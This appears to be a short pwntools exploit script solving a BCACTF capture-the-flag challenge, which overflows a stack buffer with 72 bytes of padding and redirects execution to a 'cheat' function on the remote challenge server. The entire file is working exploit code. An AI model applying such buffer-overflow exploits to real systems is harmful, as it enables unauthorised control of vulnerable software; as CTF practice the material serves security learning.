from pwn import *

elf = ELF('./analysis')
# p = process(elf.path)
p = remote('bin.bcactf.com', 49158)

OFFSET = 72

print(p.clean())
p.sendline(b'A' * OFFSET + p64(elf.symbols['cheat']))

p.interactive()

